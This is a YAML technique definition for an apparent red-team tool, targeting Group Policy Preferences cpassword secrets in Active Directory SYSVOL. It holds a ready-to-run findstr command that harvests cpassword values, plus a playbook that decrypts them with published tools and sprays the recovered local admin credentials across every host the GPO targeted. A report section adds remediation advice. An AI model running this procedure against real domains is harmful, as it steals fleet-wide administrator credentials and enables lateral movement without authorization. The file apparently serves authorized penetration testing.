# Group Policy Preferences cpassword → local admin credential
#
# Group Policy Preferences (2008-2014) let admins push local user
# accounts + passwords via GPO. The password was stored in the
# GPO's XML as a `cpassword` attribute, "encrypted" with a
# published AES key Microsoft revealed in an MSDN article (see
# MS14-025). Any authenticated domain user has read on SYSVOL by
# design; anyone finding a cpassword can decrypt it in a second.
#
# MS14-025 removed the feature in 2014, but legacy GPOs persist —
# on decade-old ADs this hunt still lands. Genuinely new coverage.
technique: T1552.006
name: GPP cpassword in SYSVOL → local admin credential
tactic: [credential-access, privilege-escalation]
platform: [windows]
key: adroute:gpp-cpassword
ranking:
  exploitability: medium         # fewer targets since MS14-025 removed the feature
  safety: read-only              # SMB read of SYSVOL
  detection: quiet                # SYSVOL reads are normal domain traffic
detect:
  group_member: Domain Users
execute:
  # findstr /s /i across SYSVOL for the cpassword attribute in
  # every GPO XML. Groups.xml is the classic file but Services.xml,
  # Scheduledtasks.xml, DataSources.xml, Drives.xml, Printers.xml
  # all can carry cpassword too — /si covers all XML in the tree.
  # `%LOGONSERVER%\SYSVOL` resolves to the DC the user
  # authenticated against.
  command: |-
    findstr /si "cpassword" %LOGONSERVER%\SYSVOL\*.xml 2>nul
verify:
  # Every hit contains the attribute name (or the equals sign
  # separator).
  success: "cpassword"
cleanup:
  command: ""
report:
  vector_type: exposed_secret
  evidence: "on a domain (Domain Users); SYSVOL policy XML(s) with cpassword"
  description: >
    Group Policy Preferences stored deployed user passwords in
    SYSVOL XML files as `cpassword`, "encrypted" with an AES key
    Microsoft published in its own documentation. Any domain user
    can read SYSVOL and decrypt any cpassword in milliseconds. The
    resulting credential is typically a LOCAL admin push and often
    unchanged since deployment — a fleet-wide local admin
    credential for the age of the GPO.
  remediation: >
    Delete every SYSVOL XML containing a cpassword (MS14-025 is
    ancient; there's no legitimate reason to keep them). Rotate
    the local admin password on every host the GPO deployed to —
    treat it as compromised for the entire time it existed.
    Enforce LAPS so future local admin passwords are per-host and
    managed.
  refs: [T1552.006, MS14-025, gpp-cpassword]
playbook:
  summary: >
    Domain foothold + at least one cpassword hit in SYSVOL →
    decrypt attacker-side (published AES key), pivot to local
    admin on every host the GPO targeted.
  place: 'attacker-side (gpp-decrypt or `Get-GPPPassword`)'
  steps:
    - "copy the cpassword value from the on-host findstr output"
    - "decrypt with `gpp-decrypt <base64>` (Kali) or `Invoke-GPPPassword` (PowerSploit)"
    - "identify the GPO's scope: `Get-GPResultantSetOfPolicy` or read the GPO xml to find `<User>` name + target OU"
    - "add the recovered creds as `fieldkit add cred 'HOST/localadmin:<pw>'` and spray the target hosts"
  restore: ""
